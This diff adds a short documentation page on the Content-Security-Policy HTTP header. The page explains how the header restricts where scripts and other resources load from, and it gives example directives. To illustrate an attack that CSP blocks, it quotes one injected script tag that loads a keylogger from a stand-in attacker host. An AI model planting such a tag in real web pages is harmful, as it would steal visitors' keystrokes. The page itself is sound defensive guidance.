@@ -1,0 +1,30 @@
+---
+title: "Content-Security-Policy"
+description: "Dictates exactly which external resources and scripts the browser is permitted to load or execute."
+---
+
+## General Summary
+
+Dictates exactly which external resources and scripts the browser is permitted to load or execute.
+
+## Detailed Description
+
+The `Content-Security-Policy` (CSP) response header acts as a powerful allowlist for resources. It significantly mitigates the impact of Cross-Site Scripting (XSS) and data injection attacks by restricting the origins from which the browser is allowed to load images, scripts, stylesheets, and frames.
+
+## Use Cases (When, Why, and How)
+
+### When to Use It
+Deploy this header on all HTML documents returned by your web server or frontend application skeleton.
+
+### Why to Use It
+If an attacker injects a malicious `<script src="evil.com/keylogger.js">` into a comment section, a strict CSP will instruct the browser to block the execution because `evil.com` is not in the allowed script sources.
+
+### How to Use It
+You define specific directives for different resource types.
+`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-1234' https://trusted.cdn.com; img-src *;`
+
+## Example
+
+```http
+Content-Security-Policy: default-src 'self'; img-src *
+```
